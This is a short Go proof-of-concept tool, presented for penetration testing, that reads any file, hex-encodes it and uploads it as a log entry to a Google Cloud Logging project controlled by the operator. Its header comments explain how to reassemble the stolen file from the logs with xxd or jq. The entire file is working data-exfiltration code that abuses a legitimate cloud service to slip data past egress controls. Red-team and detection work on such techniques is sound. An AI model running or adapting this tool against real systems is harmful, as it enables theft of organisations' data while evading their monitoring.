// Proof of concept data exfil binary files to cloud logging via hex string
// Dennis Chow dchow[AT]xtecsystems.com March 26, 2023
// No expressed warranty or liability.
// Dependencies: go init gologexfil/main && go get cloud.google.com/logging
// Usage: go run main.go --service-cred <YOUR-ACC-CRED.json> --project-id <YOUR-GCP-PROJECTID> --exfil-file <PATH/TO/FILE.foo>
// Note: In pen testing do a go build first go build -o gologexfil ./main.go ensure you have already go get cloud.google.com/logging
// Retrieve your file in GCP Cloud Logging either by console and dump to file e.g. cat dump.txt | xxd -r -p > somefile.ext
// Alternatively use jq e.g. jq -r '.[] | {textPayload} | select(.textPayload != null) | .textPayload'  ./downloaded-logs.json > payload-hexdump.text

package main

import (
	"context"
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"os"

	"cloud.google.com/go/logging"
)

func readFiletoHex(file_name string) string {
	// *caution test with small files first* this ingests completely in memory at once vs. streaming to a buffer
	file, err := os.Open(file_name)
	if err != nil {
		log.Fatalf("Ensure you have specified a valid filepath %v", err)
	}
	defer file.Close()

	//Used ChatGPTv4 suggestion to slice the file into bytes.
	// Read the file contents into a byte slice
	fileInfo, err := file.Stat()
	if err != nil {
		panic(err)
	}
	fileSize := fileInfo.Size()
	fileData := make([]byte, fileSize)
	_, err = file.Read(fileData)
	if err != nil {
		panic(err)
	}

	//convert the binary data to hex
	hexData := hex.EncodeToString(fileData)
	return hexData
}

func main() {
	//capture user arguments at runtime
	service_acc_file := flag.String("service-cred", "", "/path/to/svc_acc_cred.json")
	project_id := flag.String("project-id", "", "your projectid from svc_acc_cred.json")
	exfil_file := flag.String("exfil-file", "", "/path/to/upload.bin")
	flag.Parse()

	//grab GCP service account from env variables
	//os.Setenv("GOOGLE_APPLICATION_CREDENTIALS", "<YOUR-SVC-ACC-CRED.json>")
	os.Setenv("GOOGLE_APPLICATION_CREDENTIALS", *service_acc_file)

	//setup gcp cloud logging client
	ctx := context.Background()
	//projectID := "<YOUR-PROJECT>"
	//client, err := logging.NewClient(ctx, projectID)
	client, err := logging.NewClient(ctx, *project_id)

	if err != nil {
		log.Fatalf("Failed to create client: %v", err)
	}

	// Sets the name of the log to write to.
	logName := "gologexfil-test"
	logger := client.Logger(logName)

	// Call the function to read the file and then push the log payload as hex representing as string
	//text := readFiletoHex("dog-image.jpeg")
	text := readFiletoHex(*exfil_file)
	logger.Log(logging.Entry{Payload: text})

	// Closes the client and flushes the buffer to the Cloud Logging service.
	if err := client.Close(); err != nil {
		log.Fatalf("Failed to close client: %v", err)
	}
	fmt.Printf("Data uploaded to log. Check cloud logging explorer.")
}
